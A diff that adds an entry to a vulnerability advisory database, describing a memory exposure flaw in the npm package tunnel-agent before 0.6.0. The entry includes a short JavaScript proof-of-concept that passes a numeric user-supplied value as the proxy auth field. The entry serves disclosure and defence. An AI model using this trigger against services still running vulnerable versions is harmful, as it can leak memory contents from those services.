@@ -1,4 +1,37 @@
 ---
+- id: npmjs:npm:tunnel-agent:598
+  title: Memory Exposure
+  description: |-
+    Versions of `tunnel-agent` before 0.6.0 are vulnerable to memory exposure.
+
+    This is exploitable if user supplied input is provided to the auth value and is a number.
+
+    Proof-of-concept:
+    ```js
+    require('request')({
+      method: 'GET',
+      uri: 'http://www.example.com',
+      tunnel: true,
+      proxy:{
+        protocol: 'http:',
+        host:'127.0.0.1',
+        port:8080,
+        auth:USERSUPPLIEDINPUT // number
+      }
+    });
+    ```
+  affected_package: tunnel-agent
+  vulnerable_versions:
+  - "<0.6.0"
+  severity: moderate
+  package_manager: npm
+  cwe: CWE-20
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Сковорода Никита Андреевич
+  references: https://npmjs.com/advisories/598
+  source_url: https://npmjs.com/advisories/598
 - id: snykio:npm:tunnel-agent:20170305
   title: Uninitialized Memory Exposure
   description: |
